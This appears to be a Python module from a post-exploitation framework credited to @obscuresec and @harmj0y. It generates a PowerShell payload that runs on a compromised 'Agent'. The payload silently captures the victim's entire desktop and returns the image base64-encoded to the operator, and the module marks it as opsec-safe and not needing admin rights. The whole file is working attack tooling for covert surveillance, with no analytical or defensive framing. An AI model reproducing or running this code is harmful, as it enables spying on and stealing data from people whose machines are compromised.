from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Get-Screenshot',

            'Author': ['@obscuresec', '@harmj0y'],

            'Description': ('Takes a screenshot of the current desktop and '
                            'returns the output as a .PNG.'),

            'Background' : False,

            'OutputExtension' : 'png',
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-TimedScreenshot.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        script = """
function Get-Screenshot 
{
    Add-Type -Assembly System.Windows.Forms
    $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
    $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
    $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
    $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
    $DrawingGraphics.Dispose()
    $ms = New-Object System.IO.MemoryStream
    $ScreenshotObject.save($ms, [Drawing.Imaging.ImageFormat]::Png)
    $ScreenshotObject.Dispose()
    [convert]::ToBase64String($ms.ToArray())
}
Get-Screenshot"""

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])

        return script
